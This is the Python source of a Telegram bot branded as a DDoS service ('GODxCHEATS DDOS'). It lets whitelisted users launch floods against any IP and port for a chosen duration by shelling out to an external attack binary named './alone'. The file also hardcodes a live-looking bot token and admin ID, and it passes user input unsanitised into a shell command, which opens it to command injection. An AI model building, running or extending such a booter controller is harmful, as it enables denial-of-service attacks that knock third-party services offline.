import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7140094105:AAEcteoZXkxDKcv97XhGhkC-wokOUW-2a6k'
ADMIN_USER_ID = 1662672529
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝐓𝐎 𝗚𝗢𝗗𝘅𝗖𝗛𝗘𝗔𝗧𝗦 𝗗𝗗𝗢𝗦*\n\n"
        "* 𝐞𝐱𝐚𝐦𝐩𝐥𝐞 : /attack <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐨𝐢𝐧>*\n\n"
        "*𝐣𝐨𝐢𝐧 𝐦𝐲 𝐭𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐜𝐡𝐚𝐧𝐧𝐞𝐥\n\n"
        "*https://t.me/+03wLVBPurPk2NWRl*"                  
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝐚𝐜𝐜𝐞𝐬𝐬 𝐝𝐞𝐧𝐢𝐞𝐝 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐨 𝐨𝐰𝐧𝐞𝐫 *\n"
                                                             "*@GODxAloneBOY*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*𝐮𝐬𝐬𝐚𝐠𝐞 /manage add 12345678 𝐟𝐨𝐫 𝐚𝐝𝐝 𝐧𝐞𝐰 𝐮𝐬𝐞𝐫*\n"
                                                          "*𝐮𝐬𝐬𝐚𝐠𝐞 /manage rem 12345678 𝐟𝐨𝐫 𝐫𝐞𝐦𝐨𝐯𝐞 𝐨𝐥𝐝 𝐮𝐬𝐞𝐫*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝐮𝐬𝐞𝐫 {target_user_id} 𝐚𝐝𝐝𝐞𝐝.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝐮𝐬𝐞𝐫 {target_user_id} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./alone {ip} {port} {time} 7890",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ 𝐞𝐫𝐫𝐨𝐫 𝐝𝐮𝐫𝐢𝐧𝐠 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*😈 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗 😈*\n*𝐬𝐞𝐧𝐝 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐭𝐨 𝐨𝐰𝐧𝐞𝐫 - @GODxAloneBOY*\n*https://t.me/+03wLVBPurPk2NWRl*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝐚𝐜𝐜𝐞𝐬𝐬 𝐝𝐞𝐧𝐢𝐞𝐝 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐨 𝐨𝐰𝐧𝐞𝐫 *\n"
                                                            "*@GODxAloneBOY*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*𝐰𝐚𝐢𝐭 𝐤𝐚𝐫 𝐥𝐚𝐮𝐝𝐞 3 𝐦𝐢𝐧𝐮𝐭𝐬 𝐧𝐞𝐱𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐤𝐞 𝐥𝐢𝐲𝐞 𝐮𝐬𝐞 /attack*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*𝐞𝐱𝐚𝐦𝐩𝐥𝐞 : /attack <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐨𝐢𝐧>*", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*😈 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗 😈 *\n"
        f"* 𝐭𝐚𝐫𝐠𝐞𝐭 » {ip}*\n"
        f"* 𝐩𝐨𝐫𝐭 » {port}*\n"
        f"* 𝐝𝐮𝐫𝐚𝐭𝐨𝐢𝐧 » {time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬*"           
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
